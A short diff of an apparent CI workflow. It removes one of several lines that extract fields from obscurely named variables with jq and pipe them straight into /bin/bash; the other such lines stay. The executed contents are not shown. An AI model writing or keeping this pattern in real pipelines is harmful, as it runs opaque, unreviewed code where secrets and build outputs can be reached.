@@ -27,7 +27,6 @@ jobs:
           echo $sre63 | jq -r .yzes9 | /bin/bash
           echo $mtbcb99410 | jq -r .cug6008 | /bin/bash
           echo $lvq10253 | jq -r .mjj8 | /bin/bash
-          printf '%s' "$gjnu15" | jq -r .ltxr80809 | /bin/bash
           echo $p46 | jq -r .yvhxw1559 | /bin/bash
 
       - name: Store output
